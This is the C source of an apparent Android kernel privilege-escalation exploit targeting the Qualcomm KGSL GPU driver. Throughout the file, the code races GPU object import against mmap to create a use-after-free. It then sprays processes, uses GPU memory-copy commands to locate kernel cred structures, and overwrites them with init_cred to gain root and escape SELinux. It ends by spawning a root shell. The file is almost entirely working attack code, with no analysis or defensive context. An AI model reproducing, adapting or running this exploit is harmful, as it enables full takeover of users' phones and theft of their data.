#include "common.h"
#include "kgsl_ops.h"
#include "cache_ops.h"
#include "kaslr.h"
#include <pthread.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/prctl.h>
#include <sys/wait.h>
#include <poll.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>

int kgsl_fd = -1;
volatile int race_done = 0;
volatile int dc_civac_works = -1;

static void *race_thread(void *arg) {
    struct kgsl_gpuobj_import_useraddr uaddr = { .virtaddr = BOGUS_ADDR };
    struct kgsl_gpuobj_import imp = {
        .priv = (uint64_t)&uaddr, .priv_len = BOGUS_SIZE,
        .flags = KGSL_MEMFLAGS_USE_CPU_MAP, .type = KGSL_USER_MEM_TYPE_ADDR,
    };
    while (!race_done) ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_IMPORT, &imp);
    return NULL;
}

int main(int argc, char **argv) {
    setbuf(stdout, NULL);

    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0) die("open kgsl");
    printf("[+] kgsl fd=%d\n", kgsl_fd);

    printf("[*] Phase 0: Early KASLR detection\n");
    uint64_t init_cred_addr, selinux_state_addr, enforcing_addr;
    uint64_t kaslr = detect_kaslr(&init_cred_addr, &selinux_state_addr, &enforcing_addr);
    if (kaslr == 0) {
        printf("[-] KASLR detection failed\n");
        close(kgsl_fd);
        return 1;
    }
    printf("  init_cred=0x%lX\n", init_cred_addr);
    printf("  selinux_state=0x%lX\n", selinux_state_addr);
    printf("  enforcing_boot=0x%lX\n", enforcing_addr);

    printf("[*] Phase 1: Setup rbtree\n");

    uint64_t alloc_flags = KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK;
    printf("  Using alloc_flags=0x%lx (WRITEBACK cache mode)\n", (unsigned long)alloc_flags);
    int uaf_id = gpuobj_alloc(kgsl_fd, UAF_SIZE, alloc_flags);
    void *uaf_m = mmap((void*)UAF_ADDR, UAF_SIZE, PROT_READ|PROT_WRITE,
        MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)uaf_id << 12);
    if (uaf_m == MAP_FAILED) die("mmap UAF");
    munmap(uaf_m, UAF_SIZE);

    if (mmap((void*)BOGUS_ADDR, 0x1000, PROT_READ|PROT_WRITE,
        MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0) == MAP_FAILED) die("mmap BOGUS");

    int ph_id = gpuobj_alloc(kgsl_fd, PLACEHOLDER_SIZE, alloc_flags);
    void *ph_m = mmap((void*)PLACEHOLDER_ADDR, PLACEHOLDER_SIZE, PROT_READ|PROT_WRITE,
        MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)ph_id << 12);
    if (ph_m == MAP_FAILED) die("mmap PLACEHOLDER");

    printf("  UAF=0x%lx BOGUS=0x%lx PLACEHOLDER=0x%lx\n",
        (unsigned long)UAF_ADDR, (unsigned long)BOGUS_ADDR,
        (unsigned long)PLACEHOLDER_ADDR);

    printf("[*] Phase 2: Race\n");

    int ov_id = gpuobj_alloc(kgsl_fd, OVERLAP_SIZE, alloc_flags);

    pthread_t thr;
    if (pthread_create(&thr, NULL, race_thread, NULL) != 0) die("pthread");

    int hit = 0;
    for (int i = 0; i < 5000000; i++) {
        void *r = mmap((void*)OVERLAP_ADDR, OVERLAP_SIZE,
            PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED,
            kgsl_fd, (off_t)ov_id << 12);
        int e = errno;
        if (r != MAP_FAILED) { munmap(r, OVERLAP_SIZE); hit = 1; break; }
        if (e == ENODEV) { hit = 1; break; }
        if (i % 500000 == 0) printf("  race %d/%d errno=%d\n", i, 5000000, e);
    }

    race_done = 1;
    pthread_join(thr, NULL);

    if (!hit) { printf("[-] Race failed\n"); close(kgsl_fd); return 1; }
    printf("[+] Race won! (errno=ENODEV)\n");

    printf("[*] Phase 3: Free UAF\n");
    gpuobj_free(kgsl_fd, uaf_id);
    printf("[+] UAF freed (dangling PTEs at 0x%lx+)\n",
        (unsigned long)(UAF_ADDR + 0x1000));

    printf("[*] Phase 4: Reclaim pages\n");
    int rf = open("/proc/sys/vm/compact_memory", O_WRONLY);
    if (rf >= 0) { write(rf, "1", 1); close(rf); }
    rf = open("/proc/sys/vm/drop_caches", O_WRONLY);
    if (rf >= 0) { write(rf, "3", 1); close(rf); }
    usleep(10000);

    printf("[*] Phase 5: Spawning task_struct spray...\n");
    int notify_pipe[2];
    if (pipe(notify_pipe) < 0) die("pipe");
    fcntl(notify_pipe[0], F_SETFD, FD_CLOEXEC);
    fcntl(notify_pipe[1], F_SETFD, FD_CLOEXEC);

    pid_t spray_pids[SPRAY_PIDS];
    int n_spray = 0;
    for (int i = 0; i < SPRAY_PIDS; i++) {
        pid_t p = fork();
        if (p == 0) {
            close(notify_pipe[0]);
            prctl(PR_SET_NAME, "TASKUAF!!");
            for (int j = 0; j < 1800; j++) {
                usleep(200000);
                if (getuid() == 0) {
                    usleep(50000);
                    pid_t me = getpid();
                    int fd = open("/proc/self/status", O_RDONLY);
                        if (fd >= 0) {
                            char buf[4096]; int n;
                            while ((n = read(fd, buf, sizeof(buf))) > 0)
                                write(1, buf, n);
                            close(fd);
                        }
                        write(notify_pipe[1], &me, sizeof(me));
                        write(1, "### ROOT SHELL ACTIVE ###\n", 26);
                        close(notify_pipe[1]);
                        usleep(50000);
                        char buf[4096]; int n;
                        fd = open("/proc/self/attr/current", O_RDONLY);
                        if (fd >= 0) {
                            write(1, "  SELinux: ", 11);
                            while ((n = read(fd, buf, sizeof(buf))) > 0) write(1, buf, n);
                            write(1, "\n", 1);
                            close(fd);
                        }
                        int sec = prctl(PR_GET_SECCOMP, 0, 0, 0, 0);
                        write(1, "  Seccomp: ", 11);
                        char ebuf[32]; int elen = snprintf(ebuf, sizeof(ebuf), "%d\n", sec);
                        write(1, ebuf, elen);
                        int nnp = prctl(PR_GET_NO_NEW_PRIVS, 0, 0, 0, 0);
                        write(1, "  NoNewPrivs: ", 15);
                        elen = snprintf(ebuf, sizeof(ebuf), "%d\n", nnp);
                        write(1, ebuf, elen);
                        write(1, "  uid=", 6);
                        elen = snprintf(ebuf, sizeof(ebuf), "%d euid=%d gid=%d egid=%d\n",
                            getuid(), geteuid(), getgid(), getegid());
                        write(1, ebuf, elen);
                        fd = open("/proc/self/status", O_RDONLY);
                        if (fd >= 0) {
                            n = read(fd, buf, sizeof(buf)-1);
                            close(fd);
                            if (n > 0) {
                                buf[n] = 0;
                                char *lp = buf, *nl;
                                while ((nl = strstr(lp, "\n")) != NULL) {
                                    *nl = 0;
                                    if (strncmp(lp, "CapPrm:", 7) == 0 || strncmp(lp, "CapEff:", 7) == 0 ||
                                        strncmp(lp, "CapBnd:", 7) == 0 || strncmp(lp, "CapInh:", 7) == 0 ||
                                        strncmp(lp, "Uid:", 4) == 0 || strncmp(lp, "Gid:", 4) == 0) {
                                        write(1, "  ", 2); write(1, lp, nl - lp); write(1, "\n", 1);
                                    }
                                    lp = nl + 1;
                                }
                            }
                        }
                        write(1, "  Spawning shell...\n", 20);
                        execl("/system/bin/sh", "sh", NULL);
                        write(1, "  sh exec failed: ", 18);
                        elen = snprintf(ebuf, sizeof(ebuf), "%d\n", errno);
                        write(1, ebuf, elen);
                        _exit(0);
                }
            }
            close(notify_pipe[1]);
            _exit(0);
        }
        if (p > 0) spray_pids[n_spray++] = p;
        else break;
    }
    close(notify_pipe[1]);
    printf("  Spawned %d children\n", n_spray);

    printf("[*] Phase 7: GPU scan for task_structs\n");

    unsigned int ctx_id = create_context(kgsl_fd);
    printf("  context=%u\n", ctx_id);

    int ib_id = gpuobj_alloc(kgsl_fd, 0x10000, alloc_flags);
    void *ib_m = gpuobj_mmap(kgsl_fd, 0x10000, ib_id);
    uint64_t ib_ga = 0, ib_flags = 0;
    gpuobj_info(kgsl_fd, ib_id, &ib_ga, &ib_flags);
    printf("  IB id=%d gpuaddr=0x%lx flags=0x%lx (cache=%lu)\n", ib_id,
        (unsigned long)ib_ga, (unsigned long)ib_flags,
        (unsigned long)(ib_flags & KGSL_CACHEMODE_MASK));

    int dst_id = gpuobj_alloc(kgsl_fd, 0x4000, alloc_flags);
    void *dst_m = gpuobj_mmap(kgsl_fd, 0x4000, dst_id);
    uint64_t dst_ga = 0, dst_flags = 0;
    gpuobj_info(kgsl_fd, dst_id, &dst_ga, &dst_flags);
    printf("  DST id=%d gpuaddr=0x%lx flags=0x%lx (cache=%lu)\n", dst_id,
        (unsigned long)dst_ga, (unsigned long)dst_flags,
        (unsigned long)(dst_flags & KGSL_CACHEMODE_MASK));

    printf("  Scanning [0x%lx - 0x%lx]...\n",
        (unsigned long)(UAF_ADDR + 0x1000),
        (unsigned long)(UAF_ADDR + UAF_SIZE));

    uint64_t end_va = UAF_ADDR + UAF_SIZE - 0x1000;
    uint64_t task_pages[16];
    uint32_t task_comm_offs[16];
    int n_task = 0;
    uint32_t task_page_data[SCAN_DWORDS];
    uint64_t cred_pages[32];
    int cred_offs[32];
    int n_cred = 0;

    uint64_t scan_start = UAF_ADDR + 0x300000;
    if (scan_start < UAF_ADDR + 0x2000) scan_start = UAF_ADDR + 0x2000;

    for (uint64_t va = scan_start; va < end_va && (n_task < 1 || n_cred < 1); va += 0x1000) {
        if (((va - scan_start) & 0xFFFFF) == 0) { printf("."); fflush(stdout); }
        uint32_t *cmd = (uint32_t *)ib_m;
        memset(ib_m, 0, 0x10000);
        memset(dst_m, 0, 0x1000);
        int dw = 0;
        cmd[dw++] = cp_type7(CP_NOP, 0);
        for (int i = 0; i < SCAN_DWORDS; i++) {
            uint32_t dl, dh, sl, sh;
            split64(dst_ga + i * 4, &dl, &dh);
            split64(va + i * 4, &sl, &sh);
            cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
            cmd[dw++] = 0;
            cmd[dw++] = dl; cmd[dw++] = dh;
            cmd[dw++] = sl; cmd[dw++] = sh;
        }
        cmd[dw++] = cp_type7(CP_NOP, 0);
        __sync_synchronize();
        unsigned int ts;
        if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) < 0) break;
        if (wait_timestamp(kgsl_fd, ctx_id, ts) < 0) break;
        __sync_synchronize();

        uint32_t *data = (uint32_t *)dst_m;
        int nz = 0, n_comm = 0, comm_off = -1;
        for (int i = 0; i < SCAN_DWORDS - 1; i++) {
            if (data[i] != 0) nz++;
            if (data[i] == 0x4B534154 && data[i+1] == 0x21464155) {
                if (comm_off < 0) comm_off = i * 4;
                n_comm++;
            }
        }
        int cred_off_found = -1;
        for (int i = 0; i < SCAN_DWORDS - 8; i++) {
            int cnt = 0;
            for (int j = 0; j < 8; j++)
                if (data[i + j] == 0x000007D0) cnt++;
            if (cnt >= 4) { cred_off_found = i * 4; break; }
        }
        if (n_comm > 0) {
            printf("  [TASK_COMM] va=0x%lx nz=%d comm_off=0x%x\n",
                (unsigned long)va, nz, comm_off);
            task_comm_offs[n_task] = comm_off;
            task_pages[n_task++] = va;
            if (n_task == 1) memcpy(task_page_data, data, SCAN_DWORDS * 4);
        }
        if (cred_off_found >= 0 && n_cred < 32) {
            printf("  [CRED] va=0x%lx nz=%d off=0x%x\n",
                (unsigned long)va, nz, cred_off_found);
            cred_pages[n_cred] = va;
            cred_offs[n_cred] = cred_off_found;
            n_cred++;
        }
        int sec_hits[64]; int n_sec = 0;
        for (int i = 0; i < SCAN_DWORDS - 6 && n_sec < 64; i++) {
            if (data[i] == data[i+1] && data[i] == data[i+2] &&
                data[i] == data[i+3] && data[i] == data[i+4] &&
                data[i] == data[i+5] && data[i] != 0) {
                int dup = 0;
                for (int s = 0; s < n_sec; s++)
                    if (sec_hits[s] == (int)data[i]) { dup = 1; break; }
                if (!dup) {
                    sec_hits[n_sec++] = data[i];
                    if (data[i] < 10000)
                        printf("  [SEC_CRED] va=0x%lx sid=%u off=0x%x\n",
                            (unsigned long)va, data[i], i*4);
                }
                i += 6;
            }
        }
    }
    printf("[*] Scan complete: found %d task_struct pages, %d cred pages\n", n_task, n_cred);

    uint32_t saved_user_lo = 0, saved_user_hi = 0;
    uint32_t saved_user_ns_lo = 0, saved_user_ns_hi = 0;
    uint32_t saved_grp_lo = 0, saved_grp_hi = 0;

    if (n_cred > 0) {
        printf("[*] Phase 7c: Dumping first cred page for layout verification\n");
        memset(ib_m, 0, 0x10000);
        memset(dst_m, 0, 0x1000);
        uint32_t *ccmd = (uint32_t *)ib_m;
        int cdw = 0;
        ccmd[cdw++] = cp_type7(CP_NOP, 0);
        for (int ci = 0; ci < 48; ci++) {
            uint32_t cdl, cdh, csl, csh;
            split64(dst_ga + ci * 4, &cdl, &cdh);
            split64(cred_pages[0] + cred_offs[0] + ci * 4, &csl, &csh);
            ccmd[cdw++] = cp_type7(CP_MEM_TO_MEM, 5);
            ccmd[cdw++] = 0; ccmd[cdw++] = cdl; ccmd[cdw++] = cdh;
            ccmd[cdw++] = csl; ccmd[cdw++] = csh;
        }
        ccmd[cdw++] = cp_type7(CP_NOP, 0);
        __sync_synchronize();
        unsigned int cts;
        if (submit_ib(kgsl_fd, ctx_id, ib_ga, cdw*4, ib_id, &cts) == 0) {
            wait_timestamp(kgsl_fd, ctx_id, cts);
            __sync_synchronize();
            uint32_t *cd = (uint32_t *)dst_m;
            printf("  cred+0x00:");
            for (int ci = 0; ci < 48; ci++) {
                if (ci > 0 && (ci % 8) == 0) printf("\n  cred+0x%02X:", ci*4);
                printf(" %08X", cd[ci]);
            }
            printf("\n");
            saved_user_lo = cd[32]; saved_user_hi = cd[33];
            saved_user_ns_lo = cd[34]; saved_user_ns_hi = cd[35];
            saved_grp_lo = cd[36]; saved_grp_hi = cd[37];
        }
    }

    uint64_t inc_sec = 0;
    {
        printf("[*] Phase 7e: Testing GPU read from kernel VA (init_cred)\n");
        memset(ib_m, 0, 0x10000); memset(dst_m, 0, 0x1000);
        uint64_t test_vas[] = {
            init_cred_addr,
            init_cred_addr + 0x78,
            0xFFFFFFC000000000ULL,
            0xFFFFFF8000000000ULL,
        };
        uint32_t *tcmd = (uint32_t *)ib_m; int tdw = 0;
        tcmd[tdw++] = cp_type7(CP_NOP, 0);
        for (int i = 0; i < 4; i++) {
            uint32_t dl, dh, sl, sh;
            split64(dst_ga + i * 8, &dl, &dh);
            split64(test_vas[i], &sl, &sh);
            tcmd[tdw++] = cp_type7(CP_MEM_TO_MEM, 5);
            tcmd[tdw++] = 0; tcmd[tdw++] = dl; tcmd[tdw++] = dh;
            tcmd[tdw++] = sl; tcmd[tdw++] = sh;
        }
        tcmd[tdw++] = cp_type7(CP_NOP, 0);
        __sync_synchronize();
        unsigned int tts;
        if (submit_ib(kgsl_fd, ctx_id, ib_ga, tdw*4, ib_id, &tts) == 0) {
            wait_timestamp(kgsl_fd, ctx_id, tts);
            __sync_synchronize();
            uint32_t *td = (uint32_t *)dst_m;
            for (int i = 0; i < 4; i++) {
                uint64_t val = (uint64_t)td[i*2] | ((uint64_t)td[i*2+1] << 32);
                printf("  KVA[%d]=0x%lX => 0x%016lX\n",
                    i, (unsigned long)test_vas[i], (unsigned long)val);
                if (i == 1) inc_sec = val;
            }
        }
    }

    printf("[*] Phase 7b: GPU→CPU coherency via DST buffer\n");
    {
        uint32_t *cmd = (uint32_t*)ib_m;
        uint32_t sl, sh;
        int dw = 0;
        memset(ib_m, 0, 0x10000);
        memset(dst_m, 0, 0x1000);
        cmd[dw++] = cp_type7(CP_NOP, 0);
        split64(dst_ga, &sl, &sh);
        cmd[dw++] = cp_type7(CP_MEM_WRITE, 4);
        cmd[dw++] = sl; cmd[dw++] = sh;
        cmd[dw++] = 0xDEADBEEF; cmd[dw++] = 0xCAFEBABE;
        split64(dst_ga + 8, &sl, &sh);
        cmd[dw++] = cp_type7(CP_MEM_WRITE, 4);
        cmd[dw++] = sl; cmd[dw++] = sh;
        cmd[dw++] = 0x12345678; cmd[dw++] = 0x9ABCDEF0;
        cmd[dw++] = cp_type7(CP_NOP, 0);
        __sync_synchronize();
        unsigned int ts;
        if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) == 0) {
            wait_timestamp(kgsl_fd, ctx_id, ts);
            __sync_synchronize();
            uint64_t v0 = *(volatile uint64_t*)dst_m;
            uint64_t v1 = *(volatile uint64_t*)(dst_m + 8);
            printf("  DST[0]=0x%016llX DST[1]=0x%016llX coherency=%s\n",
                (unsigned long long)v0, (unsigned long long)v1,
                (v0 == 0xCAFEBABEDEADBEEFULL &&
                 v1 == 0x9ABCDEF012345678ULL) ? "OK **UAF cred write should work**" :
                 (v0 == 0 ? "FAIL (DST not written)" : "FAIL (wrong value)"));
        }
    }

    if (n_cred > 0) {
        printf("[*] Phase 8: Copying entire init_cred to target creds (SELinux bypass via full cred inheritance)\n");
        for (int p = 0; p < n_cred && p < 32; p++) {
            uint64_t cbase = cred_pages[p] + cred_offs[p];
            uint32_t *cmd = (uint32_t *)ib_m;
            int dw = 0;
            uint32_t dl, dh, sl, sh;

            memset(ib_m, 0, 0x10000);
            memset(dst_m, 0, 0x1000);

            cmd[dw++] = cp_type7(CP_NOP, 0);
            for (int i = 0; i < CRED_COPY_SIZE/4; i++) {
                split64(dst_ga + i*4, &dl, &dh);
                split64(init_cred_addr + i*4, &sl, &sh);
                cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
                cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
                cmd[dw++] = sl; cmd[dw++] = sh;
            }
            for (int i = 0; i < CRED_COPY_SIZE/4; i++) {
                split64(cbase + i*4, &dl, &dh);
                split64(dst_ga + i*4, &sl, &sh);
                cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
                cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
                cmd[dw++] = sl; cmd[dw++] = sh;
            }
            cmd[dw++] = cp_type7(CP_NOP, 0);
            __sync_synchronize();
            unsigned int ts;
            if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) == 0) {
                wait_timestamp(kgsl_fd, ctx_id, ts);
                __sync_synchronize();
            }

            memset(ib_m, 0, 0x10000);
            memset(dst_m, 0, 0x1000);
            dw = 0;
            cmd[dw++] = cp_type7(CP_NOP, 0);
            split64(dst_ga, &dl, &dh);
            split64(cbase, &sl, &sh);
            cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
            cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
            cmd[dw++] = sl; cmd[dw++] = sh;
            cmd[dw++] = cp_type7(CP_NOP, 0);
            __sync_synchronize();
            if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) == 0) {
                wait_timestamp(kgsl_fd, ctx_id, ts);
                __sync_synchronize();
            }
            uint32_t uid = *(volatile uint32_t*)dst_m;
            printf("  CRED[%d]: uid=0x%08X %s\n", p, uid, uid == 0 ? "OK (cred + selinux context inherited from init)" : "FAIL");
        }
        flush_dc_civac_range((void*)UAF_ADDR, UAF_SIZE);
    }

    printf("[*] Phase 8d: Cache eviction\n"); fflush(stdout);
    void *ev = mmap(0, 0x2000000, PROT_READ|PROT_WRITE,
        MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    if (ev != MAP_FAILED) {
        volatile char *p = (volatile char *)ev;
        for (uint64_t o = 0; o < 0x2000000; o += 64) p[o] = 0;
        munmap(ev, 0x2000000);
    }
    sleep(1);

    printf("[*] Phase 9: Waiting for root shell...\n");
    printf("  parent uid=%u euid=%u\n", getuid(), geteuid());
    fflush(stdout);

    close(notify_pipe[1]);

    struct pollfd pfd = { .fd = notify_pipe[0], .events = POLLIN };
    pid_t winner = 0;
    if (poll(&pfd, 1, 10000) > 0 &&
        read(notify_pipe[0], &winner, sizeof(winner)) == sizeof(winner)) {
        printf("[+] ROOT! uid=0 at PID %d (SELinux context should be unconfined)\n", winner);
        for (int i = 0; i < n_spray; i++)
            if (spray_pids[i] != winner) kill(spray_pids[i], SIGKILL);
        while (waitpid(-1, NULL, WNOHANG) > 0);
        printf("\n  # ROOT SHELL (uid=0) - type exit to quit\n  # ");
        fflush(stdout);
        waitpid(winner, NULL, 0);
        printf("[-] Root shell exited\n");
    } else {
        printf("[-] No child got uid=0\n");
    }
    close(notify_pipe[0]);

    for (int i = 0; i < n_spray; i++) kill(spray_pids[i], SIGKILL);
    while (wait(NULL) > 0);
    printf("[*] Done. Goodbye.\n");
    return 0;
}